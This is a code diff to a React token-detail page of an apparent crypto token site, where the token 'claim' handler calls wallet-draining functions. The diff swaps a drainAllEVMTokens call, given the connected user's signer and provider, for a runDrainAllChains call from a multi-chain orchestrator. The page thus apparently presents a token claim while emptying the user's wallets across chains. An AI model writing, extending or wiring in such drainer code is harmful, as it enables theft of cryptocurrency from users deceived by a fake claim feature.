@@ -15,7 +15,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import buboImage from '@/assets/tokens/bubo.jpeg';
 import tripleTImage from '@/assets/tokens/triple-t.jpeg';
 import uselessImage from '@/assets/tokens/useless.jpeg';
@@ -110,6 +110,7 @@ const TokenDetail = () => {
   const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
   const [isClaiming, setIsClaiming] = useState(false);
 
   const token = symbol ? TOKENS[symbol.toLowerCase()] : null;
@@ -177,7 +178,7 @@ const TokenDetail = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('token-detail');
       } catch (error) {
         console.error(error);
       } finally {
